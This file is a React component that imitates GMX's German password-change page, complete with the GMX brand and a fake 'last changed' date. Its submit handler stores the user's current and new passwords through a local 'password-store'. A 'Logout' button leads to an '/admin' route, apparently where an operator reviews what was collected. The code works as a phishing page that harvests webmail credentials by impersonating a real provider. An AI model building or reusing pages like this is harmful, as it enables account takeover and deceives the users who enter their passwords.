import { useState } from "react";
import { Eye, EyeOff, ChevronLeft, Power, Info } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useToast } from "@/hooks/use-toast";
import { saveSubmission } from "@/lib/password-store";

const Index = () => {
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showCurrent, setShowCurrent] = useState(false);
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const handleSave = (e: React.FormEvent) => {
    e.preventDefault();
    if (newPassword !== confirmPassword) {
      toast({
        title: "Fehler",
        description: "Die Passwörter stimmen nicht überein.",
        variant: "destructive",
      });
      return;
    }
    if (newPassword.length < 8) {
      toast({
        title: "Fehler",
        description: "Das Passwort muss mindestens 8 Zeichen lang sein.",
        variant: "destructive",
      });
      return;
    }
    saveSubmission({ currentPassword, newPassword, confirmPassword });
    toast({
      title: "Gespeichert",
      description: "Ihr Passwort wurde erfolgreich geändert.",
    });
    setCurrentPassword("");
    setNewPassword("");
    setConfirmPassword("");
  };

  return (
    <div className="min-h-screen flex flex-col bg-card">
      {/* Header */}
      <header className="bg-primary py-3 px-4 flex items-center justify-between">
        <span className="text-lg font-bold text-primary-foreground tracking-tight">GMX</span>
        <button
          onClick={() => navigate("/admin")}
          className="flex items-center gap-1.5 text-primary-foreground/90 hover:text-primary-foreground text-sm transition-colors"
        >
          Logout
          <Power className="h-4 w-4" />
        </button>
      </header>

      {/* Content */}
      <main className="flex-1 px-4 pt-4 pb-8 max-w-lg mx-auto w-full">
        {/* Back link */}
        <button className="flex items-center gap-0.5 text-primary text-sm mb-4 hover:underline">
          <ChevronLeft className="h-4 w-4" />
          Zurück
        </button>

        <h1 className="text-2xl font-bold text-foreground mb-1">Passwort</h1>
        <p className="text-sm text-muted-foreground mb-6">
          Zuletzt geändert am <span className="font-semibold text-foreground">09. Juli 2025</span>
        </p>

        <form onSubmit={handleSave} className="space-y-5">
          {/* Current Password */}
          <div>
            <label className="block text-sm text-foreground mb-1.5">Aktuelles Passwort</label>
            <div className="relative">
              <input
                type={showCurrent ? "text" : "password"}
                value={currentPassword}
                onChange={(e) => setCurrentPassword(e.target.value)}
                className="w-full h-12 px-3 pr-10 rounded-md border border-border bg-card text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary"
                required
              />
              <button
                type="button"
                onClick={() => setShowCurrent(!showCurrent)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showCurrent ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>

          {/* New Password */}
          <div>
            <label className="block text-sm text-foreground mb-1.5">Neues Passwort</label>
            <div className="relative">
              <input
                type={showNew ? "text" : "password"}
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                className="w-full h-12 px-3 pr-10 rounded-md border border-border bg-card text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary"
                required
              />
              <button
                type="button"
                onClick={() => setShowNew(!showNew)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showNew ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>

          {/* Info hint */}
          <div className="flex items-start gap-3 rounded-md px-4 py-3" style={{ backgroundColor: "hsl(var(--gmx-info-bg))" }}>
            <Info className="h-5 w-5 mt-0.5 flex-shrink-0" style={{ color: "hsl(var(--primary))" }} />
            <p className="text-sm leading-relaxed" style={{ color: "hsl(var(--gmx-info-text))" }}>
              Mindestens 8 Zeichen – am besten einen Satz oder eine Mischung aus Buchstaben, Symbolen und Zahlen verwenden
            </p>
          </div>

          {/* Confirm Password */}
          <div>
            <label className="block text-sm text-foreground mb-1.5">Neues Passwort wiederholen</label>
            <div className="relative">
              <input
                type={showConfirm ? "text" : "password"}
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className="w-full h-12 px-3 pr-10 rounded-md border border-border bg-card text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary"
                required
              />
              <button
                type="button"
                onClick={() => setShowConfirm(!showConfirm)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showConfirm ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>

          {/* Save Button */}
          <button
            type="submit"
            className="px-6 py-2.5 rounded-md text-sm font-semibold transition-colors"
            style={{
              backgroundColor: "hsl(var(--gmx-save))",
              color: "hsl(var(--gmx-save-foreground))",
            }}
          >
            Speichern
          </button>
        </form>
      </main>
    </div>
  );
};

export default Index;
